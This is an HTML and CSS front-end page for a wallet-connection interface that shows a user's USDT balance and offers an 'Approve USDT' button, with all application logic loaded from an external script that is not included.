<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ethereum USDT Approver</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }
    button {
      background: #3b82f6;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      margin: 10px;
      transition: background 0.3s;
    }
    button:hover {
      background: #2563eb;
    }
    button:disabled {
      background: #9ca3af;
      cursor: not-allowed;
    }
    #walletInfo {
      display: none;
      margin-top: 20px;
      border: 1px solid #e5e7eb;
      padding: 15px;
      border-radius: 8px;
      background: #f9fafb;
    }
    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .popup {
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 400px;
      text-align: center;
    }
    .fade-in {
      animation: fadeIn 0.5s;
    }
    .fade-out {
      animation: fadeOut 0.5s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }
  </style>
</head>
<body>
  <h1>Connect Wallet & Approve USDT</h1>

  <button id="connectWallet">
    <i class="fas fa-wallet" style="margin-right: 0.5rem;"></i> Connect Wallet
  </button>

  <div id="introDiv" class="fade-in">
    <p>Connect your wallet to check USDT balance and approve spending.</p>
  </div>

  <div id="walletInfo">
    <h3>Wallet Details</h3>
    <p>Address: <span id="userAddress"></span></p>
    <p>Balance: <span id="userBalance">0</span> USDT</p>
    <input type="hidden" id="userAddressInput" />
    <button onclick="copyAddress()">
      <i class="fas fa-copy" style="margin-right: 0.5rem;"></i> Copy Address
    </button>
  </div>

  <button id="approveUSDT" style="display: none;">
    <i class="fas fa-award" style="margin-right: 0.5rem;"></i> Approve USDT
  </button>

  <!-- Pre-Connect Overlay -->
  <div id="preConnectOverlay" class="overlay">
    <div class="popup">
      <h3>Connect Wallet</h3>
      <p>Scan QR code with your wallet app.</p>
      <button id="preConnectClose">Close</button>
    </div>
  </div>

  <!-- Connection Success Overlay -->
  <div id="connectionPopupOverlay" class="overlay">
    <div class="popup">
      <h3>Wallet Connected!</h3>
      <p>Address: <span class="user-address"></span></p>
      <button id="popupCloseBtn">Close</button>
    </div>
  </div>

  <!-- Load your app with ES Modules (Vite) -->
  <script type="module" src="/app.js"></script>
</body>
</html>
